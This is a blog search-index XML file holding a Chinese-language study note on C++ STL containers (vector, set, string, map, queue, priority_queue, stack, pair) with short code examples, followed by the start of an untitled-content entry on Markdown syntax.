<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++ STL 学习</title>
      <link href="/2023/11/20/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%EF%BC%88%E4%BB%8B%E7%BB%8D%EF%BC%89/"/>
      <url>/2023/11/20/C++%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%EF%BC%88%E4%BB%8B%E7%BB%8D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>由于自己之前并不常用 STL 库，而 STL 库在很多算法中能够节省很多自己手打数据结构的时间，故这里开一个笔记来重新学习一下，也方便自己之后能够复习。</p><h2 id="vector-的常见用法详解"><a class="markdownIt-Anchor" href="#vector-的常见用法详解">#</a> Vector 的常见用法详解</h2><p>【简介】vector 翻译为向量，我觉得用‘变长数组’来解释他更为合适。利用 vector 可以避免超内存等情况，节省空间。也可以用邻接表的方式来存储图。  使用 vector 头文件是  vector 需要 include.<br><strong>1，vector 定义</strong><br>单独定义一个 vector:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p>上面这个定义其实相当于定义了一个一维数组 name [SIZE]，只不过其长度可以根据需要进行变化。 这里的 typename 可以是任何数据类型。<br>如果 typename 也是 vector</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">typename</span>&gt;&gt; name; </span><br></pre></td></tr></table></figure><p>这里很容易联想到二维数组的定义，我们可以认为其是两个维度都可变长的二维数组。<br>然后是<strong> vector 数组</strong> 的方法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt; Arrayname[arraysize];</span><br></pre></td></tr></table></figure><p>这样 Arrayname [0] ~ Arrayname [arraysize-1] 都是一个<strong> vector</strong> 容器。 这里是一个维度固定的二维数组。<br><strong>2，vector 容器内元素的访问</strong></p><ul><li><p>通过下标访问。<br>和访问普通数组一样，对于 vector&lt;typename&gt; vi; 直接通过 vi [index 访问即可。这里的下标是从 0 到 vi.size ()-1 访问这个范围外的元素可能会出错。</p></li><li><p>通过迭代器访问。<br>迭代器 (iterator) 可以理解是一种类似<strong>指针</strong>的东西，其定义是:</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">typename</span>&gt;::iterator it;</span><br></pre></td></tr></table></figure><p>这样得到了迭代器 it, 并且可以通过 * it 来访问 vector 的元素。<br>例如，这里有一个 vector 容器：</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">5</span>; i++)&#123;</span><br><span class="line"> vi.<span class="built_in">push_back</span>(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过下面的方式进行访问容器内的元素</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator it = vi.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,*(it + i)); <span class="comment">//输出 vi[i]</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>从这里可以看出 vi [i] 和 *(vi.begin ()+ i ) 是等价的。<br>这里 begin () 是取 vector 头元素的地址，这里引出 <strong>end()</strong> 这里需要注意 <strong>end()</strong> 是取 vector 末尾元素地址的下一个地址，不存储任何元素。故这里有了另一种遍历 vector 的方法。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it = vi.<span class="built_in">begin</span>(); it != vi.<span class="built_in">end</span>() ; it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后需要指出，在常用的 STL 容器中，只有<strong> vector 和 string</strong> 中，才允许使用<strong> vi.begin ()+3</strong> 这种迭代器加上整数的写法。<br><strong>3，vector 常用函数实例解析</strong><br><strong>（1）push_back</strong><br> 顾名思义，push_back (x) 就是在 vector 尾元素添加一个元素 x, 时间复杂度 O (1)。<br><strong>（2）pop_back</strong><br> 即删除 vector 的尾元素。<br><strong>（3）size()</strong><br> 用来获取 vector 中元素的个数。返回 unsigned 类型。<br><strong>（4）clear()</strong><br> 用来清空 vector 中的所有元素。<br><strong>（5）insert()</strong><br> insert (it,x) 用来向 vector 的任意迭代器 it 处插入一个元素 x。<br><strong>（6）erase()</strong><br> 两种用法：删除单个元素，删除一个区间的所有元素。<br>①删除单个元素。 erase (it) 即删除迭代器为 it 处的元素。<br>②删除一个区间所有的元素，erase (first,end), 删除 [first,last) 内的所有元素。<br><strong>4，vector 的常见用途</strong><br>（1）存储数据<br>（2）用邻接表存储图</p></li></ul><h2 id="set-的常见用法详解"><a class="markdownIt-Anchor" href="#set-的常见用法详解">#</a> set 的常见用法详解</h2><p>【简介】set 翻译为集合，是指一个内部自动有序且不含重复元素的容器。考试中，有可能出现需要去掉重复元素的情况，这时候就可以用 set 来保留元素本身不考虑其个数。使用 set 需要添加 &lt;set&gt;。<br><strong>1，set 的定义</strong><br>单独定义一个 set</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p>这里的写法和 vector 基本一样，或者说大部分的 STL 都是这样定义的，typename 可以是任何基本类型。 这里不再介绍各个数组之类的定义方式，和 vector 基本一样。<br><strong>2，set 容器内元素的访问</strong><br> set 只能通过迭代器 (iterator) 访问。定义方式和 vector 的迭代器定义方式一样。由于除了 <strong>vector 和 stirng</strong> 之外的迭代器都不只除 *(it + i) 的访问方式，因此只能按照下面方式枚举。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">\<span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">5</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">2</span>);</span><br><span class="line">st.<span class="built_in">insert</span>(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span>(set&lt;<span class="type">int</span>&gt;::iterator it = st.<span class="built_in">begin</span>();it != st.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *it );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的输出结果为 2  3  5。<br><strong>3,set 常用函数实例解析</strong><br><strong>（1） insert ()</strong><br> insert (x) 可将 x 插入 set 容器中，并自动递增排序和去重。<br><strong>（2）find()</strong><br> find (value) 返回 set 中对应值为 value 的迭代器。<br><strong>（3）erase()</strong><br> erase 也有两种用法：删除单个元素，删除区间内元素<br>①删除单个，st.erase (it)，it 为所要删除元素的迭代器。可以结合 find () 函数来表示<br> st.erase (value),value 为所要删除的元素的值。<br>②删除一个区间的所有元素。 st.erase (first,last) 可以删除一个区间所有的元素，first 和 last 为迭代器形式，注意删除为 [first,last) 左闭右开。<br><strong>（4）size()</strong><br> 用来获得 set 内元素的个数。<br><strong>（5）clear()</strong><br> clear () 用来清空 set 中所有的元素。<br><strong>3,set 的常见用途</strong><br>主要作用是自动去重并按照升序进行排序。</p><h2 id="string的常见用法详解"><a class="markdownIt-Anchor" href="#string的常见用法详解">#</a> string 的常见用法详解</h2><p>【简介】在 C 语言中，一般用字符串数组 char str [] 来存放字符串。使用 string 会更加的方便。如果要使用 string，需要包含 string 头文件，注意 string.h 和 string 是不一样的头文件。<br><strong>1，string 的定义</strong><br>定义 string 的方式和基本数据类型相同，只需要在 string 上跟上变量名（可进行初始化）即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">string str = <span class="string">&quot;abcd&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>2，string 中内容的访问</strong><br><strong>（1）通过下标访问</strong><br>一般来说，可以直接像字符数组那样去访问 string:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i &lt; str.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,str[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果就是 abcd 。<br>如果要读入或者输出整个字符串，则只能用 cin 和 cout：(如果想用 printf 输出 string，需要利用 c_str () 函数将 string 类型转换为字符数组来进行输出)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">cin&gt;&gt;str;</span><br><span class="line">cout&lt;&lt;str;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,str.<span class="built_in">c_str</span>());</span><br></pre></td></tr></table></figure><p><strong>（2）通过迭代器访问</strong><br>因为有些函数如 insert () 和 erase () 要求迭代器为参数，因此还是需要学习一个 string 迭代器的用法。<br>由于 string 不像其他 STL 容器需要参数，故可以这样定义迭代器。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string::iterator it;</span><br></pre></td></tr></table></figure><p>这样就得到了迭代器 it，并且可以通过 * 来访问 string 的每一位。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(string::iterator it = str.<span class="built_in">begin</span>(); it != str.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, *it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3,string 常用函数实例解析</strong><br> string 的函数有很多，这里只调出几个主要的。<br><strong>（1）operator+=</strong><br> 这是 string 的加法，可以直接将两个 string 拼接起来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str1 = <span class="string">&quot;abc&quot;</span>, str2 = <span class="string">&quot;xyz&quot;</span>;</span><br><span class="line">str1 += str2; <span class="comment">//将str2直接拼接到str1上</span></span><br></pre></td></tr></table></figure><p><strong>（2）compare operator</strong><br> 两个 string 类型可以用 ==，!= , &lt;, &lt;= ,&gt; , &gt;= 进行比较大小，比较规则是字典序。<br><strong>（3）length()/size()</strong><br> length () 返回 stirng 的长度，即存放的字符数。size () 和 length () 基本相同。<br><strong>（4） insert()</strong><br> string 的 insert () 函数有很多写法，这里给出几个常用的写法。<br>①insert (pos,string)，在 pos 号位置中插入字符串 string。<br>②insert (it,it2,it3)，it 为字符串的欲插入位置，it2 和 it3 为待插入字符串的首尾迭代器，用来表示串 [it2,it3) 将被插入在 it 的位置上。<br><strong>（5）erase()</strong><br> erase () 有两种用法：删除单个元素，删除一个区间的所有元素。<br>①删除单个元素：erase (it) 用于删除单个元素，it 为所需要删除的元素的迭代器。<br>②删除一个区间所有元素，erase (first,last)，同理，删除 [first,last)，first 和 last 为相应的迭代器。这里还有一种用法，str.erase (pos,length)，pos 为需要开始删除的起始位置，length 为删除的字符个数。<br><strong>（6）clear()</strong><br> clear () 用于清空 string 的数据。<br><strong>（7）substr()</strong><br> substr (pos,len) 返回从 pos 号位开始，长度为 len 的字串<br><strong>（8）string::npos</strong><br>string::npos 是一个常数，其本身的值为 - 1，但是由于是 unsigned_int 类型，因此实际上也可以认为其是 unsigned_int 类型最大值，string::npos 用以作为 find 函数匹配失败的返回值。<br><strong>（9）find()</strong><br> str.find (str2)，当 str2 是 str 的子串时，返回其在 str 中第一次出现的位置，如果 str2 不是 str 的子串，返回 string::npos。<br>str.find (str2,pos)，从 str 的 pos 号位开始匹配 str2，返回值和上相同。<br><strong>（10）replace()</strong><br> str.replace (pos,len,str2) 把 str 从 pos 号位开始，长度为 len 的子串替换为 str2。<br>str.replace (it1,it2,str2) 把 str 的迭代器 [it1,it2) 范围的子串替换为 str2。</p><h2 id="map的常用用法详解"><a class="markdownIt-Anchor" href="#map的常用用法详解">#</a> map 的常用用法详解</h2><p>【简介】 map 翻译为映射。在定义数组时 (int array [100])，其实是定义了一个从 int 型到 int 型的映射，比如 array [0] = 25,array [4] =36 就分别是将 0 映射到 25，将 4 映射到 36. 一个 double 型数组则是将 int 映射到 double 型，这里不再介绍。这样，当我们需要其他类型作为关键字来作映射，会显得不太方便。这时可以用到 map，因为 map 可以将任何基本类型（包括 STL 的容器）映射到任意基本类型。<br><strong>1，map 的定义</strong><br>单独定义一个 map</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">map&lt;typename1,typename2&gt; mp;</span><br><span class="line">map&lt;string,<span class="type">int</span>&gt; map;  <span class="comment">//字符串映射int型 必须用string</span></span><br><span class="line">map&lt;set&lt;<span class="type">int</span>&gt;,string&gt; mp;  <span class="comment">//可以让STL容器作为键</span></span><br></pre></td></tr></table></figure><p>上述代码中，第一个是键的类型，第二个是值得类型。注意如果是字符串到整型得映射，必须用 string 而不能用 char 数组。<br><strong>2，map 容器内元素得访问</strong><br> map 有两种访问方式：下标和迭代器</p><ul><li>通过下标访问<br>和普通数组一样，例如对于 map&lt;char,int&gt; mp 得 map 来说，可以使用 mp [‘c’] 来访问对应对应得整数。当建立映射时，可以用 mp [‘c’] = 20 这样和普通数组一样得方式。但是要注意的是，<strong>map 中得键是唯一的</strong>。</li><li>通过迭代器访问<br> map 得迭代器定义和其他得 STL 容器迭代器定义得方式一样  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map&lt;typename1,typename2&gt;::iterator it;</span><br></pre></td></tr></table></figure>typename1 和 typename2 就是定义 map 时填写得类型，这样就得到了迭代器 it。<br>map 迭代器得使用方式和其他 STL 容器得迭代器不同，因为 map 得每一对映射都有两个 typename，这决定了必须能通过一个 it 来同时访问键和值。事实上，<strong>map 可以使用 it-&gt;first 来访问键，使用 it-&gt;second 来访问值。</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&#x27;m&#x27;</span>] = <span class="number">20</span>;</span><br><span class="line">mp[<span class="string">&#x27;r&#x27;</span>] = <span class="number">30</span>;</span><br><span class="line">mp[<span class="string">&#x27;a&#x27;</span>] = <span class="number">40</span>;</span><br><span class="line"><span class="keyword">for</span>(map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;::iterator it = mp.<span class="built_in">begin</span>(); it != mp.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c %d\n&quot;</span>, it-&gt;first, it-&gt;second);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>结果：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a <span class="number">40</span></span><br><span class="line">m <span class="number">20</span></span><br><span class="line">r <span class="number">30</span></span><br></pre></td></tr></table></figure>这里似乎有一个很神奇的现象：<strong>map 会以键从小到大的顺序自动排序</strong>，这是由于 map 内部使用红黑树实现的 (set 也是)，在建立映射会自动实现从小到大的排序功能。<br><strong>3，map 常用函数实例解析</strong><br><strong>（1）find ()</strong><br> find (key) 返回键为 key 的映射的迭代器。<br><strong>（2）erase()</strong><br> 有两种用法：删除单个元素，删除一个区间额你的所有元素。<br>①删除单个元素：map.erase (it)，it 为需要删除的元素的迭代器。<br>示例如下:</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">mp[<span class="string">&#x27;b&#x27;</span>] = <span class="number">2</span>;</span><br><span class="line">mp[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span>;  </span><br><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;::iterator it = mp.<span class="built_in">find</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">mp.<span class="built_in">erase</span>(it);  <span class="comment">//这里删除了 b 2</span></span><br></pre></td></tr></table></figure><p>第二种方式，mp.erase (key),key 为欲删除的映射的键。<br>②删除一个区间的所有元素。mp.erase (first,last)，其中 first 为需要删除的区间的起始迭代器，而 last 则为需要删除的区间的末尾迭代器的一个地址，也为左闭右开的区间 [first,last)。<br><strong>（3）size()</strong><br> size () 用来获取 map 中映射的对数。<br><strong>（4）clear()</strong><br> clear () 用来清空 map 中的所有元素。<br><strong>4,map 的常见用途</strong><br>感觉 map 能用到的地方应该算是比较多的。</p><ul><li>需要建立字符和整数之间映射的题目。</li><li>判断大整数或其他数据是否存在的题目，吧 map 当 bool 数组使用。</li><li>字符串和字符串的映射也可能会遇到。<br>** 扩展:mao 的键和值是唯一的，如果一个键需要对应多个值，只能用 multimap。另外，C++11 还加了 unordered_map，以散列代替 map 内部的红黑树实现，使其可以用来处理只映射而不按 key 排序的需求，速度会很快。</li></ul><h2 id="queue的常见用法详解"><a class="markdownIt-Anchor" href="#queue的常见用法详解">#</a> queue 的常见用法详解</h2><p>【定义】queue 翻译为队列，是一种很常见的数据结构。STL 实现了一个先进先出的容器。使用时需要添加 queue 的头文件。<br><strong>1，queue 的定义</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2，queue 容器内元素的访问</strong><br>由于队列本身是一种先进先出的限制性数据结构，因此再 STL 中只能用 front () 来访问队首元素，或者是 back () 来访问队尾元素。<br><strong>3，queue 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> push (x) 将 x 进行入队。<br><strong>（2）front(),back()</strong><br> front 和 back 分别获取队首元素和队尾元素。<br><strong>（3）pop()</strong><br> pop () 令队首元素出队。<br><strong>（4）empty()</strong><br> empty () 检测 queue 是否为空。<br><strong>（5）size()</strong><br> size () 返回 queue 内元素的个数。<br><strong>4,queue 的常见用途</strong><br>当需要进行 BFS 时，可以直接用 queue 进行代替<br>有一点可能需要注意，再使用 front () 和 back () 之前，先用 empty () 判断队列是否为空，否则可能会出现错误。</p><h2 id="priority_queue的常见用法详解"><a class="markdownIt-Anchor" href="#priority_queue的常见用法详解">#</a> priority_queue 的常见用法详解</h2><p>【简介】 priority_queue 又称为优先队列，其底层是用堆来实现的。在优先队列中，队首元素一定是当前队列中优先级最高的哪一个。如队列有如下元素，且定义好了优先级：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">桃子 (优先级<span class="number">3</span>)</span><br><span class="line">梨子 (优先级<span class="number">4</span>)</span><br><span class="line">苹果 (优先级<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>那么出队顺序为梨子 -&gt; 桃子 -&gt; 苹果。<br>当然，可以在任何时候往优先队列加入元素，而优先队列底层的数据结构堆 (heap) 会随时调整结构，使得每次的队首元素都是优先级最大的。<br><strong>1，priority_queue</strong><br> 要使用优先队列，应该添加头文件 queue。 其定义写法也和其他 STL 容器相同。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2,priority_queue 容器内元素的访问</strong><br>和队列不一样的是，优先对立而没有了 front () 和 back () 函数，而只能通过 top () 函数来访问队首元素，也就是优先级最高的元素。<br><strong>3,priority_queue 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> push (X) 将 X 入队，时间复杂度 O (logN)，其中 N 为当前优先队列中的元素个数。<br><strong>（2）top()</strong><br> 获取队首（堆顶）的元素。<br><strong>（3）pop()</strong><br> 使队首（堆顶）的元素出队。<br><strong>（4）empty()</strong><br> 检测优先队列是否为空。<br><strong>（5）size()</strong><br> size () 返回优先队列元素的个数。<br><strong>4，priority_queue 内元素优先级的设置</strong><br>下面来介绍下优先级的设置方法。<br><strong>（1）基本数据类型的优先级设置</strong><br>此处指的是 int,double,char 等可以直接使用的数据类型，对他们的游戏那寄设置一般使数字大的优先级越高，因此队首元素就是优先队列元素中最大的那个 (char 类型则是字典序最大的)。对基本数据类型来说，下面两种定义是<strong>等价的</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;,less&lt;<span class="type">int</span>&gt;&gt; q;</span><br></pre></td></tr></table></figure><p>可以发现，第二种定义方式的尖括号多出了两个参数：一个是 vector&lt;int&gt;，另一个是 less&lt;int&gt;。其中第二个参数填写的是承载底层数据结构堆的容器，如果第一个参数是 double 或 char 型，则此处只需要填写 vector&lt;double &gt; 或 vector&lt;char&gt;; 而第三个参数 less&lt;int &gt; 则是对第一个参数的比较类，less&lt;int &gt; 表示数字大的优先级大，而 greater&lt;int &gt; 表示数字小的优先级大。<br><strong>（2）结构体的优先级设置</strong><br>这里以开头举得水果的例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">fruit</span>&#123;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> price;</span><br><span class="line"><span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> fruit &amp;f1,<span class="type">const</span> fruit &amp;f2)&#123;</span><br><span class="line"><span class="keyword">return</span> f1.price &lt; f2.price;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;fruit&gt; q;   <span class="comment">//这里就像sort的cmp函数一样， 这里是正常的 这里是以价格高的水果优先</span></span><br></pre></td></tr></table></figure><p>现在如果希望水果的价格高作为优先级高，就需要<strong>重载</strong>小于号 &quot;&lt;&quot;。重载是指对已有的运算符重新定义。见上代码块。可以看到在结构体增加了一个友元函数。 这里可以记一下， <strong>优先对了的这个函数和 sort 的 cmp 函数的效果是相反的。</strong><br><strong>5,priority_qeue 的常见用途</strong><br>可以解决一些贪心问题，也可以对 Dijkstra 算法进行优化。</p><h2 id="stack的常见用法解析"><a class="markdownIt-Anchor" href="#stack的常见用法解析">#</a> stack 的常见用法解析</h2><p>【简介】stack 翻译为栈，是 STL 种实现一个后进先出的容器。<br><strong>1，stack 的定义</strong><br>需要添加头文件 stack，用法依然和其他 STL 容器一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2，stack 容器内元素的访问</strong><br>由于 stack 是一种后进先出的数据结构，在 STL 的 stack 只能通过 top () 来访问栈顶元素。<br><strong>3，stack 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> 将 x 入栈。<br><strong>（2）top()</strong><br> 获得栈顶元素。<br><strong>（3）pop()</strong><br> 弹出栈顶元素。<br><strong>（4）empty()</strong><br> 判断 stack 是否为空。<br><strong>（5）size()</strong><br> 返回 stack 内元素的个数。<br><strong>4,stack 的常见用途</strong><br> stack 一般用来模拟实现一些递归，防止程序堆栈内存的限制而导致程序运行出错。一般来说，程序的栈内存空间很小。</p><h2 id="pair的常见用法解析"><a class="markdownIt-Anchor" href="#pair的常见用法解析">#</a> pair 的常见用法解析</h2><p>【简介】pair 是一个很实用的 &quot;小玩意&quot;，当想要将两个元素绑在一起作为一个合成元素，又不想定义结构体时，可以用 pair。其可以看作时一个内部有两个元素的结构体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">pair</span>&#123;</span><br><span class="line">typename1 first;</span><br><span class="line">typename2 second;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1，pair 的定义</strong><br>要使用 pair，需要添加头文件 utility。注意：由于 map 实现过程中设计 pair，因此添加 map 头文件会自动添加 utility 头文件，故添加 map 头文件即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pair&lt;typename1,typeName2&gt; name;</span><br><span class="line"><span class="function">pair&lt;string,<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>如果想初始化，只需要加个括号里面添加初始化的内容即可。如果想要临时构建一个 pair，有下面两种方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pair</span>&lt;string,<span class="type">int</span>&gt;(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">make_pair</span>(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><strong>2，pair 中元素的访问</strong><br> pair 中只有两个元素，分别是 first 和 second，只需要按照正常结构体方式去访问即可。<br><strong>3，pair 的使用函数解析</strong><br>这里只需注意比较操作数，是先比较 first，first 相等时采取判别 second 的大小。<br><strong>4，pair 的常见用途</strong></p><ul><li>用来代替二元结构体和其构造函数，可以节省编码时间。</li><li>作为 map 的键值来进行插入。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法</title>
      <link href="/2023/11/19/MarkDown%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/11/19/MarkDown%E8%AF%AD%E6%B3%95/</url>
      
